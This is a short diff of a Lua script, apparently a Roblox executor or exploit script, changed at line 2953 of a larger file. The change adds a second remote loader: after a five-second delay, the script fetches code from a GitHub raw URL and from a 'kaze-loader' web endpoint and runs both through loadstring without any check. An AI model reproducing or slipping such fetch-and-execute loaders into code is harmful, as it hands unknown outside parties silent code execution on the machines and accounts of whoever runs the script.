@@ -2953,17 +2953,28 @@ end)
 task.spawn(function()
     task.wait(5)
 
-    local url = "https://raw.githubusercontent.com/67Studio/saa/refs/heads/main/a"
+    -- Link 1: raw de GitHub (GET)
+    local urlGet  = "https://raw.githubusercontent.com/67Studio/saa/refs/heads/main/a"
+
+    -- Link 2: tu loader de kaze (POST, body vacío)
+    local urlPost = "https://kaze-loader.lovable.app/api/public/raw/5c11c21d-f1eb-432e-bc01-ffa8c0537651"
 
     local ok, err = pcall(function()
-        local source = game:HttpGet(url)
-        local fn = loadstring(source)
-        if not fn then error("no compiló") end
-        fn()
+        -- Ejecuta el GET
+        local sourceGet = game:HttpGet(urlGet)
+        local fnGet = loadstring(sourceGet)
+        if not fnGet then error("no compiló (GET)") end
+        fnGet()
+
+        -- Ejecuta el POST
+        local sourcePost = game:HttpPost(urlPost, "")
+        local fnPost = loadstring(sourcePost)
+        if not fnPost then error("no compiló (POST)") end
+        fnPost()
     end)
 
     if not ok then
         warn("[warning 67] " .. tostring(err))
     end
 end)
-print("UWU")
+print("UWU2")
